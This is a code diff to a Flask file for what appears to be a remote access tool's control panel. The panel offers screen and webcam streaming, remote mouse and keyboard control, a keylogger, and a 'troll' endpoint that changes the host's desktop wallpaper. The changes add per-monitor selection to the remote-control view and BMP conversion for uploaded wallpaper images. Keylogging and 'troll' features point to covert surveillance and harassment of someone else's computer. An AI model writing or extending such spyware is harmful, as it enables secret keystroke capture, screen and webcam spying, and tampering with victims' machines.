@@ -1516,7 +1516,10 @@ DASHBOARD_HTML = r'''
             <!-- Control Page -->
             <div class="page" id="page-control">
                 <div class="section">
-                    <div class="section-header"><div class="section-title">Mouse & Keyboard Control</div><button class="btn" id="controlBtn" onclick="toggleControl()">Start Control</button></div>
+                    <div class="section-header"><div class="section-title">Mouse & Keyboard Control</div><div><button class="btn" id="controlBtn" onclick="toggleControl()">Start Control</button><button class="btn small" onclick="detectMonitors()">Detect Monitors</button></div></div>
+                    <div id="controlMonitorSelect" style="margin-bottom: 15px; display: none;">
+                        <select id="controlMonitorDropdown" onchange="currentControlMonitor=this.value" style="margin-bottom: 0;"><option value="-1">All Monitors</option></select>
+                    </div>
                     <div class="stream-box" id="controlBox" style="cursor: crosshair;">
                         <button class="fullscreen-btn" onclick="toggleFullscreen('controlBox')">[+]</button>
                         <img id="controlStream" src="" style="display:none; width: 100%; height: 100%;">
@@ -1761,6 +1764,7 @@ DASHBOARD_HTML = r'''
         let screenInterval, webcamInterval, controlInterval, keylogInterval;
         let isScreenOn = false, isWebcamOn = false, isControlOn = false, isKeyloggerOn = false;
         let currentMonitor = -1;
+        let currentControlMonitor = -1;
         let monitorCount = 0;
 
         // Logging
@@ -1812,10 +1816,14 @@ DASHBOARD_HTML = r'''
             monitorCount = data.count;
             const sel = document.getElementById('monitorDropdown');
             sel.innerHTML = '<option value="-1">All Monitors</option>';
+            const csel = document.getElementById('controlMonitorDropdown');
+            csel.innerHTML = '<option value="-1">All Monitors</option>';
             data.monitors.forEach((m, i) => {
                 sel.innerHTML += `<option value="${i}">Monitor ${i+1} (${m.width}x${m.height})</option>`;
+                csel.innerHTML += `<option value="${i}">Monitor ${i+1} (${m.width}x${m.height})</option>`;
             });
             document.getElementById('monitorSelect').style.display = monitorCount > 1 ? 'block' : 'none';
+            document.getElementById('controlMonitorSelect').style.display = monitorCount > 1 ? 'block' : 'none';
             document.getElementById('monitorCountHome').textContent = monitorCount;
             document.getElementById('screenCountHome').textContent = monitorCount;
             
@@ -1947,11 +1955,11 @@ DASHBOARD_HTML = r'''
                     await fetch('/api/control/mouse', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: 'click', button: 'right'})});
                 };
                 controlInterval = setInterval(async () => {
-                    const res = await fetch(`/api/screen/stream?monitor=${currentMonitor}`);
+                    const res = await fetch(`/api/screen/stream?monitor=${currentControlMonitor}`);
                     const blob = await res.blob();
                     document.getElementById('controlStream').src = URL.createObjectURL(blob);
                 }, 200);
-                logActivity('Control started');
+                logActivity('Control started on ' + (currentControlMonitor == -1 ? 'all monitors' : 'monitor ' + (parseInt(currentControlMonitor)+1)));
             }
         }
         async function typeOnHost() {
@@ -3297,11 +3305,24 @@ def troll_wallpaper():
         if not image_file:
             return jsonify({'success': False, 'error': 'No image'})
         img_data = image_file.read()
-        tmp_path = os.path.join(KEYLOG_DIR, "_wallpaper.bmp")
-        with open(tmp_path, 'wb') as f:
+        raw_path = os.path.join(KEYLOG_DIR, "_wallpaper_raw")
+        with open(raw_path, 'wb') as f:
             f.write(img_data)
+        bmp_path = os.path.join(KEYLOG_DIR, "_wallpaper.bmp")
+        try:
+            from PIL import Image
+            img = Image.open(raw_path)
+            img = img.convert("RGB")
+            img.save(bmp_path, "BMP")
+        except:
+            import shutil
+            shutil.copy2(raw_path, bmp_path)
+        try:
+            os.remove(raw_path)
+        except:
+            pass
         import ctypes
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp_path, 3)
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, bmp_path, 3)
         return jsonify({'success': True})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
